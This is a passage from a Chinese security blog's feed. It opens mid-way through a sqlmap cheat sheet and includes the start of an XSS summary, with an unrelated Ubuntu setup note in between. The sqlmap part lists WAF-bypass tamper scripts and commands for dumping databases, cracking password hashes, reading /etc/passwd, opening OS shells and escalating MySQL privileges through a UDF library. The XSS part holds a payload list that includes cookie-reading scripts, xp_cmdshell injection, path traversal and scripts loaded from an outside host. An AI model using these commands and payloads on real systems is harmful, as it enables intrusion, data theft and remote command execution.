空格替换其它空白符号(mysql)</p><p>between.py用between替换大于号（&gt;）</p><p>space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p><p>multiplespaces.py围绕SQL关键字添加多个空格</p><p>space2plus.py用+替换空格</p><p>bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like</p><p>nonrecursivereplacement.py双重查询语句,取代SQL关键字</p><p>space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p><p>sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</p><p>chardoubleencode.py双url编码(不处理以编码的)</p><p>unionalltounion.py替换UNION ALLSELECT UNION SELECT</p><p>charencode.py　url编码</p><p>randomcase.py随机大小写</p><p>unmagicquotes.py宽字符绕过 GPCaddslashes</p><p>randomcomments.py用/**/分割sql关键字</p><p>charunicodeencode.py字符串 unicode 编码</p><p>securesphere.py追加特制的字符串</p><p>versionedmorekeywords.py注释绕过</p><p>space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’</p><p>halfversionedmorekeywords.py关键字前加注释</p><h2 id="URL重写SQL注入测试"><a href="#URL重写SQL注入测试" class="headerlink" title="URL重写SQL注入测试"></a>URL重写SQL注入测试</h2><p>value1为测试参数，加“*”即可，sqlmap将会测试value1的位置是否可注入。</p><p>sqlmap.py -u”<a href="http://targeturl/param1/value1*/param2/value2/”" target="_blank" rel="noopener">http://targeturl/param1/value1*/param2/value2/”</a></p><h2 id="列举并破解密码哈希值"><a href="#列举并破解密码哈希值" class="headerlink" title="列举并破解密码哈希值"></a>列举并破解密码哈希值</h2><p>  当前用户有权限读取包含用户密码的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><p>sqlmap.py -u”<a href="http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1”</a> –passwords -v1</p><h2 id="获取表中的数据个数"><a href="#获取表中的数据个数" class="headerlink" title="获取表中的数据个数"></a>获取表中的数据个数</h2><p>sqlmap.py -u”<a href="http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”" target="_blank" rel="noopener">http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1”</a> –count -Dtestdb</p><h2 id="对网站secbang-com进行漏洞爬去"><a href="#对网站secbang-com进行漏洞爬去" class="headerlink" title="对网站secbang.com进行漏洞爬去"></a>对网站secbang.com进行漏洞爬去</h2><p>sqlmap.py -u “<a href="http://www.secbang.com“–batch" target="_blank" rel="noopener">http://www.secbang.com“–batch</a> –crawl=3</p><h2 id="基于布尔SQL注入预估时间"><a href="#基于布尔SQL注入预估时间" class="headerlink" title="基于布尔SQL注入预估时间"></a>基于布尔SQL注入预估时间</h2><p>sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b" target="_blank" rel="noopener">http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1“-b</a> –eta</p><h2 id="使用hex避免字符编码导致数据丢失"><a href="#使用hex避免字符编码导致数据丢失" class="headerlink" title="使用hex避免字符编码导致数据丢失"></a>使用hex避免字符编码导致数据丢失</h2><p>sqlmap.py -u “<a href="http://192.168.48.130/pgsql/get_int.php?id=1”" target="_blank" rel="noopener">http://192.168.48.130/pgsql/get_int.php?id=1”</a> –banner –hex -v 3 –parse-errors</p><h2 id="模拟测试手机环境站点"><a href="#模拟测试手机环境站点" class="headerlink" title="模拟测试手机环境站点"></a>模拟测试手机环境站点</h2><p>python sqlmap.py -u”<a href="http://www.target.com/vuln.php?id=1”" target="_blank" rel="noopener">http://www.target.com/vuln.php?id=1”</a> –mobile</p><h2 id="智能判断测试"><a href="#智能判断测试" class="headerlink" title="智能判断测试"></a>智能判断测试</h2><p>sqlmap.py -u “<a href="http://www.antian365.com/info.php?id=1“–batch" target="_blank" rel="noopener">http://www.antian365.com/info.php?id=1“–batch</a> –smart</p><h2 id="结合burpsuite进行注入"><a href="#结合burpsuite进行注入" class="headerlink" title="结合burpsuite进行注入"></a>结合burpsuite进行注入</h2><p>（1）burpsuite抓包，需要设置burpsuite记录请求日志</p><p>sqlmap.py -r burpsuite抓包.txt</p><p>（2）指定表单注入</p><p>sqlmap.py -u URL –data“username=a&amp;password=a”</p><h2 id="sqlmap自动填写表单注入"><a href="#sqlmap自动填写表单注入" class="headerlink" title="sqlmap自动填写表单注入"></a>sqlmap自动填写表单注入</h2><p>自动填写表单：</p><p>sqlmap.py -u URL –forms</p><p>sqlmap.py -u URL –forms –dbs</p><p>sqlmap.py -u URL –forms –current-db</p><p>sqlmap.py -u URL –forms -D 数据库名称–tables</p><p>sqlmap.py -u URL –forms -D 数据库名称 -T 表名 –columns</p><p>sqlmap.py -u URL –forms -D 数据库名称 -T 表名 -Cusername，password –dump</p><h2 id="读取linux下文件"><a href="#读取linux下文件" class="headerlink" title="读取linux下文件"></a>读取linux下文件</h2><p> sqlmap.py-u “url” –file /etc/password</p><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>sqlmap.py -u URL –technique -T–current-user</p><h2 id="sqlmap-结合burpsuite进行post注入"><a href="#sqlmap-结合burpsuite进行post注入" class="headerlink" title="sqlmap 结合burpsuite进行post注入"></a>sqlmap 结合burpsuite进行post注入</h2><p>结合burpsuite来使用sqlmap：</p><p>（1）浏览器打开目标地址<a href="http://www.antian365.com" target="_blank" rel="noopener">http://www.antian365.com</a></p><p>（2）配置burp代理(127.0.0.1:8080)以拦截请求</p><p>（3）点击登录表单的submit按钮</p><p>（4）Burp会拦截到了我们的登录POST请求</p><p>（5）把这个post请求复制为txt, 我这命名为post.txt 然后把它放至sqlmap目录下</p><p>（6）运行sqlmap并使用如下命令：</p><p>./sqlmap.py -r post.txt -p tfUPass</p><h2 id="sqlmap-cookies注入"><a href="#sqlmap-cookies注入" class="headerlink" title="sqlmap cookies注入"></a>sqlmap cookies注入</h2><p>sqlmap.py -u “<a href="http://127.0.0.1/base.PHP“–cookies" target="_blank" rel="noopener">http://127.0.0.1/base.PHP“–cookies</a> “id=1″  –dbs –level 2</p><p>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。可以通过burpsuite等工具获取当前的cookie值，然后进行注入：</p><p>sqlmap.py -u 注入点URL –cookie”id=xx” –level 3</p><p>sqlmap.py -u url –cookie “id=xx”–level 3 –tables(猜表名)</p><p>sqlmap.py -u url –cookie “id=xx”–level 3 -T 表名 –coiumns</p><p>sqlmap.py -u url –cookie “id=xx”–level 3 -T 表名 -C username，password –dump</p><h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h2><p>（1）连接mysql数据打开一个交互shell:</p><p>sqlmap.py -dmysql://root:<a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>:3306/test –sql-shell</p><p>select @@version;</p><p>select @@plugin_dir;</p><p>d:\wamp2.5\bin\mysql\mysql5.6.17\lib\plugin\</p><p>（2）利用sqlmap上传lib_mysqludf_sys到MySQL插件目录:</p><p>sqlmap.py -dmysql://root:<a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a>:3306/test –file-write=d:/tmp/lib_mysqludf_sys.dll–file-dest=d:\wamp2.5\bin\mysql\mysql5.6.17\lib\plugin\lib_mysqludf_sys.dll</p><p>CREATE FUNCTION sys_exec RETURNS STRINGSONAME ‘lib_mysqludf_sys.dll’</p><p>CREATE FUNCTION sys_eval RETURNS STRINGSONAME ‘lib_mysqludf_sys.dll’</p><p>select sys_eval(‘ver’); </p><h2 id="执行shell命令"><a href="#执行shell命令" class="headerlink" title="执行shell命令"></a>执行shell命令</h2><p>sqlmap.py -u “url” –os-cmd=”netuser” /<em>执行net user命令</em>/</p><p>sqlmap.py -u “url” –os-shell /<em>系统交互的shell</em>/</p><h2 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h2><p>sqlmap –dbs -u”url” –delay 0.5 /<em>延时0.5秒</em>/</p><p>sqlmap –dbs -u”url” –safe-freq /<em>请求2次</em>/</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;原文地址：&lt;a href=&quot;https://www.freebuf.com/sectool/164608.html&quot; tar
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019的总结与展望</title>
    <link href="https://xytk0x0.github.io/2019/12/24/2019%E7%9A%84%E6%80%BB%E7%BB%93%E4%B8%8E%E5%B1%95%E6%9C%9B/"/>
    <id>https://xytk0x0.github.io/2019/12/24/2019的总结与展望/</id>
    <published>2019-12-24T07:24:50.000Z</published>
    <updated>2019-12-30T12:53:04.128Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="59743244d741902de599262eff99ea5fb81c965f310a3d3ad683b8c1a8a783d7"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>hacker101 ctf(1)</title>
    <link href="https://xytk0x0.github.io/2019/12/21/hacker101-ctf-1/"/>
    <id>https://xytk0x0.github.io/2019/12/21/hacker101-ctf-1/</id>
    <published>2019-12-21T14:03:52.000Z</published>
    <updated>2019-12-27T04:30:10.611Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="输入密码：" />    <label for="hbePass">输入密码：</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="355afa5fc839b6feab87e47ceccf0325f9c63b9b16636697189925e3b1ae2d65"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章。如果你认识我的话，可以大胆猜一猜密码。
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="wp" scheme="https://xytk0x0.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu--获取IP&amp;&amp;换源&amp;&amp;安装中文输入法</title>
    <link href="https://xytk0x0.github.io/2019/12/21/Ubuntu-%E8%8E%B7%E5%8F%96IP-%E6%8D%A2%E6%BA%90-%E5%AE%89%E8%A3%85%E4%B8%AD%E6%96%87%E8%BE%93%E5%85%A5%E6%B3%95/"/>
    <id>https://xytk0x0.github.io/2019/12/21/Ubuntu-获取IP-换源-安装中文输入法/</id>
    <published>2019-12-21T13:53:45.000Z</published>
    <updated>2019-12-21T14:02:43.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取IP"><a href="#获取IP" class="headerlink" title="获取IP"></a>获取IP</h1><p>执行ifconfig后，只有lo</p><p>ifconfig -a 可以看见所有的网卡</p><blockquote><p>执行sudo dhclient</p></blockquote><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Failed to fetch http://us.archive.ubuntu.com/ubuntu/pool/universe/p/python-pip/python-pip-whl_8.1.1-2ubuntu0.4_all.deb  Hash Sum mismatch</span><br><span class="line">Failed to fetch ubuntu python-pip-whl_8.1.1-2ubuntu0.4_all.deb  Hash Sum mismatch</span><br></pre></td></tr></table></figure><p>需要换源：</p><p>国内的主要有阿里、网易云等。</p><p>root身份：</p><p>cd /etc/apt</p><p>mv sources.list sources.list_bak</p><p>gedit sources.list</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted</span><br><span class="line">deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-properties</span><br><span class="line">deb http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb-src http://archive.canonical.com/ubuntu xenial partner</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-properties</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse</span><br></pre></td></tr></table></figure><h1 id="ubuntu-16-04-安装中文输入法"><a href="#ubuntu-16-04-安装中文输入法" class="headerlink" title="ubuntu 16.04 安装中文输入法"></a>ubuntu 16.04 安装中文输入法</h1><blockquote><p>System Settings-&gt;Language Support，选择Install/Remove Languages，安装简体中文</p></blockquote><p>安装iBus框架：</p><blockquote><p>sudo apt-get install ibus ibus-clutter ibus-gtk ibus-gtk3 ibus-qt4</p></blockquote><p>切换到ibus框架：</p><blockquote><p>im-config -s ibus</p></blockquote><p>安装拼音引擎：</p><blockquote><p>sudo apt-get install ibus-pinyin</p></blockquote><p>调出ibus Preference添加拼音输入法：</p><blockquote><p>sudo ibus-setup   流程：input–&gt;add–&gt;chinese–&gt;pinyin</p></blockquote><blockquote><p>settings–&gt;text entry–&gt;+–&gt;chinese(pinyin)(ibus)</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;获取IP&quot;&gt;&lt;a href=&quot;#获取IP&quot; class=&quot;headerlink&quot; title=&quot;获取IP&quot;&gt;&lt;/a&gt;获取IP&lt;/h1&gt;&lt;p&gt;执行ifconfig后，只有lo&lt;/p&gt;
&lt;p&gt;ifconfig -a 可以看见所有的网卡&lt;/p&gt;
&lt;blockquote&gt;
      
    
    </summary>
    
    
      <category term="环境安装或问题解决办法" scheme="https://xytk0x0.github.io/categories/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%88%96%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
    
      <category term="环境安装或问题解决办法" scheme="https://xytk0x0.github.io/tags/%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%88%96%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>XSS小结</title>
    <link href="https://xytk0x0.github.io/2019/12/18/XSS%E5%B0%8F%E7%BB%93/"/>
    <id>https://xytk0x0.github.io/2019/12/18/XSS小结/</id>
    <published>2019-12-18T01:30:27.000Z</published>
    <updated>2019-12-21T14:05:53.041Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>相关链接：</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/82469035" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/82469035</a></p><h1 id="XSS原理及分类"><a href="#XSS原理及分类" class="headerlink" title="XSS原理及分类"></a>XSS原理及分类</h1><p>跨站脚本攻击(XSS)，攻击者向web应用中插入浏览器可执行恶意代码，当用户浏览页面时，恶意代码会被执行，达到恶意目的。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>反射型、存储型、DOM型</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>通常需要用户点击攻击者的链接，本地浏览器执行恶意脚本。</p><p>攻击流程：</p><img src="/2019/12/18/XSS小结/0.png" title="xytk0x0"><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>不需要精心构造链接，恶意脚本会存入服务器中，当用户访问服务器中对应的资源时，恶意脚本执行。</p><p>攻击流程：</p><img src="/2019/12/18/XSS小结/1.png" title="xytk0x0"><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>本质上是反射型的XSS</p><p>以参数的方式，通过js脚本读取或改变DOM中的内容，从而改变页面的内容。</p><h1 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h1><p><a href="https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt" target="_blank" rel="noopener">https://github.com/pgaijin66/XSS-Payloads/blob/master/payload.txt</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br><span class="line">&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">=&apos;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(vulnerable)&lt;/script&gt;</span><br><span class="line">%3Cscript%3Ealert(&apos;XSS&apos;)%3C/script%3E</span><br><span class="line">&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp</span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line">%3f.jsp</span><br><span class="line">%3f.jsp</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">?sql_debug=1</span><br><span class="line">a.jsp/&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">a?&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&apos;Vulnerable&apos;)&lt;/script&gt;</span><br><span class="line">&apos;;exec%20master..xp_cmdshell%20&apos;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&apos;--&amp;&amp;</span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=JaVaScRiPt:alert(&quot;XSS&quot;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=javascript:alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&lt;IMG src=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br><span class="line">&lt;IMG src=&quot; javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;</span><br><span class="line">&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</span><br><span class="line">&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;BGSOUND src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;br size=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</span><br><span class="line">&lt;LAYER src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;</span><br><span class="line">&lt;LINK REL=&quot;stylesheet&quot; href=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IMG src=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;</span><br><span class="line">&lt;IMG src=&quot;mocha:[code]&quot;&gt;</span><br><span class="line">&lt;IMG src=&quot;livescript:[code]&quot;&gt;</span><br><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&lt;IFRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/IFRAME&gt;</span><br><span class="line">&lt;FRAMESET&gt;&lt;FRAME src=javascript:alert(&apos;XSS&apos;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;</span><br><span class="line">&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;behaviour: url(&apos;http://www.how-to-hack.org/exploit.html&apos;);&quot;&gt;</span><br><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;</span><br><span class="line">&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</span><br><span class="line">&lt;IMG STYLE=&apos;xss:expre\ssion(alert(&quot;XSS&quot;))&apos;&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</span><br><span class="line">&lt;STYLE TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A class=&quot;XSS&quot;&gt;&lt;/A&gt;</span><br><span class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="line">&lt;BASE href=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;</span><br><span class="line">getURL(&quot;javascript:alert(&apos;XSS&apos;)&quot;)</span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&apos;XSS&apos;);&quot;;eval(a+b+c+d);</span><br><span class="line">&lt;XML src=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;BODY ONLOAD=&quot;a();&quot;&gt;&lt;SCRIPT&gt;function a()&#123;alert(&apos;XSS&apos;);&#125;&lt;/SCRIPT&gt;&lt;&quot;</span><br><span class="line">&lt;SCRIPT src=&quot;http://xss.ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;IMG src=&quot;javascript:alert(&apos;XSS&apos;)&quot;</span><br><span class="line">&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;</span><br><span class="line">&lt;IMG src=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT =&quot;&gt;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT a=&quot;&gt;&quot; &apos;&apos; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/SCRIPT&gt;</span><br><span 